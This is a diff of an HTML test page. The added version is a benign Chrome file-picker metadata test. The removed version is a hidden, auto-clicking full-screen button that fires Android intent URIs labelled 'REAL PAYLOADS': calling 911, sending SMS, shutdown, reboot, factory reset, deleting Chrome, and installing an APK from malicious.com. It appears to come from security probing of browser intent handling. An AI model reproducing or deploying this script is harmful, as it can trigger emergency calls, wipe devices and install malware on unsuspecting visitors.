@@ -1,76 +1,29 @@
 <!DOCTYPE html>
 <html>
 <body>
-<button onclick="testActionIntents()" style="width:100vw;height:100vh;opacity:0.01;"></button>
+<h1>FileUtilitiesHost Test</h1>
+<button id="trigger">Select a File</button>
 
 <script>
-function testActionIntents() {
-  // THESE ARE THE REAL PAYLOADS - ACTIONS NOT JUST VIEWING
-  
-  const actionIntents = [
-    // === DIALER & CALLS ===
-    'intent:#Intent;action=android.intent.action.CALL;tel:10086;end',  // Emergency-like number
-    'intent:#Intent;action=android.intent.action.CALL;tel:911;end',    // US Emergency
-    
-    // Dial (shows dialer with number)
-    'intent:#Intent;action=android.intent.action.DIAL;tel:15551234567;end',
-    
-    // === SMS ===
-    'intent:#Intent;action=android.intent.action.SENDTO;smsto:15551234567?body=HELLO;end',
-    'intent:#Intent;action=android.intent.action.SEND;S.android.intent.extra.TEXT=Hacked;type=text/plain;end',
-    
-    // === POWER CONTROLS ===
-    'intent:#Intent;action=android.intent.action.ACTION_REQUEST_SHUTDOWN;end',
-    'intent:#Intent;action=android.intent.action.REBOOT;end',
-    
-    // Power menu (some devices)
-    'intent:#Intent;action=android.intent.action.CLOSE_SYSTEM_DIALOGS;end',
-    
-    // === TOGGLE SETTINGS ===
-    // Airplane mode (requires system app)
-    'intent:#Intent;action=android.settings.AIRPLANE_MODE_SETTINGS;S.state=true;end',
-    
-    // WiFi toggle
-    'intent:#Intent;action=android.net.wifi.WIFI_STATE_CHANGED;S.enabled=false;end',
-    
-    // Bluetooth toggle
-    'intent:#Intent;action=android.bluetooth.adapter.action.REQUEST_DISCOVERABLE;end',
-    
-    // === MEDIA CONTROLS ===
-    'intent:#Intent;action=android.media.action.VOLUME_CHANGED_ACTION;S.volume=0;end',
-    'intent:#Intent;action=android.intent.action.MEDIA_BUTTON;end',
-    
-    // === SYSTEM ACTIONS ===
-    'intent:#Intent;action=android.settings.ACTION_SETTINGS;S.show_fragment=WirelessSettings;end',
-    
-    // === BROADCAST INTENTS ===
-    'intent:#Intent;action=android.intent.action.BOOT_COMPLETED;end',
-    'intent:#Intent;action=android.intent.action.ACTION_POWER_DISCONNECTED;end',
-    
-    // === DANGEROUS SYSTEM COMMANDS ===
-    // Factory reset (WILL PROMPT!)
-    'intent:#Intent;action=android.intent.action.FACTORY_RESET;end',
-    
-    // Clear app data
-    'intent:#Intent;action=android.intent.action.DELETE;package=com.android.chrome;end',
-    
-    // Install APK
-    'intent:#Intent;action=android.intent.action.INSTALL_PACKAGE;uri=http://malicious.com/app.apk;end',
-  ];
-  
-  actionIntents.forEach((intent, i) => {
-    setTimeout(() => {
-      console.log('Testing action:', intent.substring(0, 60));
-      try {
-        window.location = intent;
-      } catch(e) {
-        console.error('Failed');
-      }
-    }, i * 800);
-  });
-}
+document.getElementById('trigger').addEventListener('click', async () => {
+    try {
+        // Step 1: Trigger Chrome's file picker (this reaches FileUtilitiesHost internally)
+        const [fileHandle] = await window.showOpenFilePicker();
+        
+        // Step 2: Request metadata (size, type, lastModified)
+        const file = await fileHandle.getFile();
+        
+        console.log("File Name:", file.name);
+        console.log("File Size:", file.size);
+        console.log("Last Modified:", file.lastModified);
 
-setTimeout(() => document.querySelector('button').click(), 1000);
+        // Step 3: Optional: Check the type
+        console.log("File Type:", file.type);
+        
+    } catch (err) {
+        console.error("Error accessing file:", err);
+    }
+});
 </script>
 </body>
 </html>
